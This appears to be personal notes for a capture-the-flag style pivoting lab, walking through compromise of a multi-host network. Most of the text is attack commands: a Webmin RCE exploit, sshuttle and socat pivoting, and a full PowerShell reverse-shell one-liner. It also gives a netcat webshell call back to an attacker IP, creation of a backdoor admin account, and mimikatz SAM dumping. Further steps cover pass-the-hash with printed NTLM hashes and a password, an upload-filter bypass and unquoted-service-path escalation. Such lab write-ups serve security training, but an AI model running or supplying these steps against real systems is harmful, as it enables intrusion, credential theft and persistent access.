Machine About pivoting.

Looking at the nmap result, it ran the Webmin 1.890 which is vulnerable to CVE-2019-15107 Unauthorized remote code execution. Cloning https://github.com/MuirlandOracle/CVE-2019-15107.git exploit and use it to get reverse shell as root.

Get the root ssh key for persistence `/root/.ssh/id_rsa`

Copy static nmap to the `.200` host. Ping scan reveal a `.100` and `.150` host.
The `.150` host have open ports, refer to the nmap page.

Connect to the target using .200 as a pivot with a sshuttle proxy:
`sshuttle -r root@10.200.196.200 --ssh-cmd "ssh -i root_key.rsa" 10.200.196.0/24 -x 10.200.196.200`

Port 80 in `.150` is a gitstack, which is vulnerable and the exploit is available in searchsploit. The 43777 EDB can be used, after editing the ip and the name of the payload. This create a Remote code execution.

The .150 host cannot connect to our server, so we need to set up a relay in .200 with socat.
Open the firewall with: `firewall-cmd --zone=public --add-port PORT/tcp`
`./socat tcp-l:41822 tcp:10.50.193.140:9001 &` on our compromised host.
Listen on port 9001 in our attacker.

The payload for opening power shell:
```
powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('10.200.196.200',41822);$nstream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
and url encode it.

Create an Admin user with:
```powershell.exe
net user NetherPenguin NwreathPenguin /add
net localgroup Administrators USERNAME /add  #add to Administrators group
net localgroup "Remote Management Users" USERNAME /add #and Remote users
```

Connect to the .150 host with evil-winrm:
```bash
gem install evil-winrm
evil-winrm -u USERNAME -p PASSWORD -i TARGET_IP
```

or RDP with:
```bash
xfreerdp /v:IP /u:USERNAME /p:PASSWORD
xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
```
optons:
-   `/dynamic-resolution` -- allows us to resize the window, adjusting the resolution of the target in the process
-   `/size:WIDTHxHEIGHT` -- sets a specific size for targets that don't resize automatically with `/dynamic-resolution`
-   `+clipboard` -- enables clipboard support
-   `/drive:LOCAL_DIRECTORY,SHARE_NAME` -- creates a shared drive between the attacking machine and the target. This switch is insanely useful as it allows us to very easily use our toolkit on the remote target, and save any outputs back directly to our own hard drive. In essence, this means that we never actually have to create any files on the target. For example, to share the current directory in a share called `share`, you could use: `/drive:.,share`, with the period (`.`) referring to the current directory

With this we have some tools like mimikatz in `\\tsclient\share`.
In mimikatz give ourself debug privilege and elevate into system:
```cmd
privilege::debug
token::elevate

lsadump::sam #dump local password
```

get NTLM HASH:
Administrator:37db630168e5f82aafa8461e05c6bbd1
Thomas:02d90eda8f6b6b06c32d5f207831101f:i<3ruby

use this to get persistent access:
`evil-winrm -u Administrator -H ADMIN_HASH -i IP`

From this access, we can use script to gain further access, either with copying through evil-winrm `upload` or `download`, or just loading the script directly with `-s ` like this:
`evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.196.150 -s /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/`
`-s` load scripts in the supplied directory on memory.
Just type the name of the script to load it.

Scanning the last host with Invoke-PortScan, we get port 80 and 3389 open.
Use chisel to be able to open the webserver on the last host. Don't forget to open a port first with:
`netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=PORT`

access the .100 webserver with foxyproxy, you can see that it is the same website as in the public webserver.

Recall that he is saying that the website is deployed from git. As we have access to the gitserver machine, we can search for the repositories. It is located in `C:\Gitstack\repositories\Website.git`. download that folder to our machine.

We can use GitTools from `git clone https://github.com/internetwache/GitTools` to manipulate the repositories like recreate it in a readable format.

We found the latest commit by looking at the commit-meta.txt. The last commit have a php file that's used for file upload. Its located on `website/resources` we can authenticate with Thomas account in gitserver.
To upload we need to pass the filter that check for the extension(bypassed by making additional extension) and checking for dimension in the exif.
The second filter can be bypassed by attaching our payload after an actual image by using `exiftool` like this:
`exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-USERNAME.jpeg.php`
Creating an obfuscated webshell payload, we then upload an obfuscated netcat and run it on powershell to get a shell using this link:
`10.200.196.100/resources/uploads/shell-NetherPenguin.jpg.php?wreath=powershell.exe c:\\windows\\temp\\nc-NetherPenguin.exe 10.50.193.140 8000 -e cmd.exe`


As this machina have AV active(windows defender), we need to do a manual enumeration including:
```cmd
whoami /priv #check the user privilege
whoami /groups #check the user group
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows" #check the service running, excluding from C:\Windows
```
Getting a unquoted service path vulnerability, we create an exploit using a mono package.(the wrapper directory). After compiling it, we transfer it using impacket with this command:
```bash
sudo git clone https://github.com/SecureAuthCorp/impacket /opt/impacket && cd /opt/impacket && sudo pip3 install . #install impacket in /opt/impacket
sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword #open smbserver
```

connect to the impacket smb in windows with:
`net use \\10.50.193.140\share /USER:user s3cureP@ssword`

Copy the wrapper.exe to temp with: `copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe`
Then close the smb with: `net use \\ATTACKER_IP\share /del`

After testing that our payload works, we now try to use the unquoted service exploit to get root.

!!! Learn how to make pseudoshell from RCE !!!